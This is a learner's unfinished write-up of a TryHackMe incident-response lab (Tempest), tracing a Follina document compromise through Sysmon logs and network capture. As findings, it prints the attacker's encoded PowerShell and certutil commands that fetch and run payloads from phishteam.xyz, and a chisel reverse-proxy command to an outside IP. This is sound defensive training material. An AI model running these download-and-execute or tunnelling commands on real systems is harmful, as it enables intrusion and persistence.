# [SIEM Triage for SOC]

**TryHackMe Path**: [SOC Level 1]  
**Lab Topic**: [Tempest]  
**Date Completed**: [04//2026]

---

## 🧠 Summary

> In this lab, I learned how to 

---

## 🎯 Objectives
- [ ] Complete Challenge Room
      
---

## 🧰 Tools Used
- THM AttackBox
- Splunk

---

## 📊 Analysis & Screenshots

*** Preparation - Tools and Artefacts ***

> In this room, i had to play the role of an incident responder focusing on handling and analyzing the captured artefacts of a compromised machine. For the first section i had to
answer questions based on the artefacts and tools needed for the investigation. For the first question i had to figure out the SHA256 of the capture.pcapng file. I retrieved the
SHA256 hash by launching powershell, then inputting the command syntax "Get-FileHash .\capture.pcapng," which then returned
"CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6."
>
> <img width="892" height="879" alt="1" src="https://github.com/user-attachments/assets/df453969-50b6-4323-8ce1-a10469126050" />

> For the next question i retrieved the SHA256 hash of the sysmon.evtx file to be "665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F."
>
> <img width="1036" height="147" alt="2" src="https://github.com/user-attachments/assets/abd891ab-8058-463a-95ff-1a0e9a901fa6" />

> For the last question of this section i retrieved the SHA256 hash of the windows.evtx file to be "D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60."
>
> <img width="1100" height="135" alt="3" src="https://github.com/user-attachments/assets/7ed2cc95-4d2e-4f64-b89c-2bbe05eaff16" />

*** Initial Access - Malicious Document ***

> For this section i had to investigate an alert that an Analyst labelled as "CRITICAL" severity. I had to use data source:
Sysmon.
For the first question i had to figure out which malicious document the user of this machine was compromised by. After further investigation i was able to retrieve the malicious
document named "free_magicules.doc."
>
> <img width="1152" height="647" alt="4" src="https://github.com/user-attachments/assets/00ad8403-7b97-486b-93cc-4b0169218775" />
> <img width="786" height="355" alt="5" src="https://github.com/user-attachments/assets/c13c279a-39bd-494c-a6d2-07cc94aee2fa" />
> <img width="1245" height="465" alt="6" src="https://github.com/user-attachments/assets/ff5728de-9af5-4afd-94a4-ec063e4504eb" />

> Moving on to the next question i wa sable to retrieve the compromised user and machine to be "benimaru-TEMPEST."
>
> <img width="1022" height="360" alt="7" src="https://github.com/user-attachments/assets/17e84ef2-fe15-469b-a8ad-e9872b2cd4a3" />

> The PID of the Microsoft Word process that opened the malicious document was discovered to be "496" within the Payload Data1 column.
>
> <img width="727" height="292" alt="8" src="https://github.com/user-attachments/assets/09e58590-0bbd-4bcc-a1e2-446c3a35deb1" />

> For the next question based on the Sysmon logs, the IPv4 address resolved by the malicious domain was discovered to be "167.71.199.191."
>
> <img width="1076" height="550" alt="9" src="https://github.com/user-attachments/assets/40247c58-ca95-4695-a9fa-c86a9eb358b9" />

> Moving on, i retrieved the Base64 encoded string in the malicious payload executed by the document to be:
NhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==
>
> <img width="1131" height="658" alt="10" src="https://github.com/user-attachments/assets/97e29add-ad88-4186-959c-50d66c6ddb1a" />

> I then identified the CVE number of the exploit used by the attacker to achieve a remote code execution to be:
2022-30190
I retrieved it by locating the binary with the same Base64 string, then inputted the binary within the input field of the LOLBAS website.
>
> <img width="1166" height="563" alt="11" src="https://github.com/user-attachments/assets/b7b95b57-9779-472c-b8a3-415fdebd5153" />
> <img width="1119" height="478" alt="12" src="https://github.com/user-attachments/assets/6ba876b0-be95-4240-847c-cc1ff23b4cbc" />
> <img width="1113" height="200" alt="13" src="https://github.com/user-attachments/assets/3b134a7b-db4c-4228-bf21-cfd65467fd89" />

*** Initial Access - Stage 2 Execution *** 

> Moving on i had to answer a few questions based on Stage 2 execution after discovering the initial finding. For the first question i had to figure out the full target path of
payload that was written by the malicious execution of the payload, which then wrote a file on the system. To figure this out i simply inputted "appdata" within the input field
of the Timeline Explorer application. After investigating the Events under Event ID 11 i retrieved the full target path to be:
"C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup."
>
> <img width="406" height="213" alt="14" src="https://github.com/user-attachments/assets/0ed5d1d8-b8e2-4835-b216-710d7dfb072b" />
> <img width="376" height="140" alt="15" src="https://github.com/user-attachments/assets/56a02b6c-dfa9-4d2d-b068-85e733e35ac8" />
> <img width="849" height="315" alt="16" src="https://github.com/user-attachments/assets/5d4f6bb1-6ae8-4cbb-9079-9ea88cc72b65" />

> I then retrieved the executed command upon successful login of the compromised user to be:
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
>
> <img width="1153" height="315" alt="17" src="https://github.com/user-attachments/assets/27a74945-8e92-47ab-bb39-61310600144e" />

> Upon investigating the Sysmon logs, i was able to retrieve the SHA256 hash of the malicious binary downloaded for Stage 2 execution to be:
CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
>
> <img width="559" height="187" alt="18" src="https://github.com/user-attachments/assets/b4dfd55b-c333-40e4-89f0-63110696cd3b" />
> <img width="994" height="310" alt="19" src="https://github.com/user-attachments/assets/e61e9510-2ee6-4f07-92f3-3df27faf9a6a" />

> Finally, for the Stage 2 execution i discovered the domain and port used by the attacker to be: "resolvecyber.xyz:80." Which was produced after the stage 2 payload downloaded
established a connection to a C2 server.
>
> <img width="399" height="159" alt="20" src="https://github.com/user-attachments/assets/dca6be0c-a9b7-48fc-8924-4b2a7cd563a8" />
> <img width="1023" height="320" alt="21" src="https://github.com/user-attachments/assets/5e34c31e-58df-4bb9-876a-f3648b51a90a" />

*** Initial Access - Malicious Document Traffic ***

> Moving on, i had to answer a few question related to the attacker fetching the Stage 2 payload remotely. For the first question i had to figure out the URL of the malicious
payload embedded in the document. To figure this out i launched Brim, then inputted the filter: _path=="http" "<phishteam.xyz>" GET. Which returned the URL:
http://phishteam.xyz/02dcf07/index.html.
>
> <img width="1137" height="678" alt="22" src="https://github.com/user-attachments/assets/27e2140a-4f5e-4248-a57d-9028c88c899f" />

> I then discovered the encoding used by the attacker on the C2 connection to be "base64."
>
> <img width="1089" height="470" alt="23" src="https://github.com/user-attachments/assets/53596d60-82fe-41ad-894f-4dd561a42f6c" />
> <img width="1650" height="766" alt="24" src="https://github.com/user-attachments/assets/c1dda3d0-99eb-4279-80b6-9d71c3202500" />

> Further into the investigation, i identified the parameter that contained the executed command results when the malicious c2 binary sends a payload to be:
"q."
I also identified the URL used by the binary to get the command to be executed as "/9ab62b5." Which used the "GET" HTTP method.
>
> <img width="476" height="280" alt="25" src="https://github.com/user-attachments/assets/af5157d4-bcfb-4547-8aa7-e37c6deafc8a" />
> <img width="431" height="215" alt="26" src="https://github.com/user-attachments/assets/41b36c15-22f9-4668-b2e0-b7ddc8d9006e" />
> <img width="995" height="234" alt="27" src="https://github.com/user-attachments/assets/40438b8f-6808-4005-be44-4c38ae48a3df" />

> Finally for this section, identified the programming language used by the attacker to compile the binary to be "nim" based on the user agent.
>
> <img width="501" height="229" alt="28" src="https://github.com/user-attachments/assets/e67b53a3-ab56-41de-9ac4-7b674de21ce5" />

*** Disocvery - Internal Reconnaissance ***

> For this section, i had to answer a few questions related to the malicious binary continuously using the C2 traffic based on the collected findings. For the first question i had
to figure out the password discovered on a sensitive file the attacker located inside the machine of the user. To figure this out i used the Brim filter:
_path=="http" "<resolvecyber.xyz>" id.resp_p==<80 | cut ts, host, id.resp_p, uri | sort ts
After gathering the selected base64 string and running it in CyberChef i was able to retrieve the password "infernotempest."
>
> <img width="1232" height="739" alt="29" src="https://github.com/user-attachments/assets/da75b3a5-4822-4631-bcf6-775f0fd61db7" />
> <img width="1661" height="856" alt="30" src="https://github.com/user-attachments/assets/47a54efe-72ab-4413-b75e-12cbb824a59a" />
> <img width="1041" height="784" alt="31" src="https://github.com/user-attachments/assets/e42a83a5-df8f-4e03-96eb-d40d9f879480" />

> I then identifed the port 5985 to be the listening port that could provide a remote shell inside the machine. Which is a port that the attacker enumerated inside the machine.
>
> <img width="1235" height="730" alt="32" src="https://github.com/user-attachments/assets/7e6741cf-6db5-4487-aa40-d1580fe95457" />
> <img width="1154" height="398" alt="33" src="https://github.com/user-attachments/assets/c62ca504-2867-441b-a509-9f19b7ca745b" />
> <img width="989" height="787" alt="34" src="https://github.com/user-attachments/assets/e5c2cde0-644d-440c-aaec-0bd197f71cbe" />

> Moving on i then identified the command executed by the attacker to establish the connection to a reverse socks proxy to access the internal services hosted inside the machine to
be:
C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
>
> <img width="1298" height="478" alt="35" src="https://github.com/user-attachments/assets/e1c9b7b9-d81a-4f23-9328-98f762e9b2b1" />

> The SHA256 hash of the binary used by the attacker to establish the reverse proxy connection was identified to be
"8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451."
>
> <img width="1290" height="554" alt="36" src="https://github.com/user-attachments/assets/9fb65a93-3a74-4e59-811c-8f7ed50a233f" />

> I then used VirusTotal to retrieve the name of the tool used by the attacker. I inputted the SHA256 i discovered for the binary into the input field, which returned the tool name:
chisel
>
> <img width="1044" height="738" alt="37" src="https://github.com/user-attachments/assets/6cf39109-e764-43df-92e2-b5c66b2146bf" />
> <img width="734" height="506" alt="38" src="https://github.com/user-attachments/assets/cc324ce2-8cb2-4179-9cb6-6b21680de8ad" />

> The attacker then used "WinRM" service to authenticate. This was based on outside research using ChatGPT.
>
> <img width="945" height="461" alt="39" src="https://github.com/user-attachments/assets/e054580d-a455-4b22-ad65-9f8a583fdbd6" />

*** Privilege Escalation - Exploiting Privileges ***

> 

--- 

## Reflection

> This lab strengthened my ability to 
